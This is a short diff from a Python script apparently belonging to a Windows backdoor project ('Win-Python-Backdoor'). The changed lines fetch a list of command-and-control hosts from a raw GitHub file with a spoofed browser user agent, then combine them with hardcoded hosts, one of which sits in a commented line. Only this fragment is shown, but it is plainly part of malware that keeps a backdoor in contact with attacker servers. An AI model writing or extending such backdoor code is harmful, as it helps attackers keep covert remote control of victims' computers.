@@ -137,8 +137,9 @@ ua = UserAgent()
 header = {'User-Agent':str(ua.chrome)}
 mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
 #print mainsite.text
-sites = ["paner.altervista.org", mainsite.text]
-print sites[1]
+sites = ["paner.altervista.org"]#, mainsite.text]
+sites.extend(mainsite.text.split(",") )
+print sites[0]+sites[1]+sites[2]
 #sites = ["paner.altervista.org", "verifiche.ddns.net"]
 #site="paner.altervista.org"
 site1="paner.altervista.org"
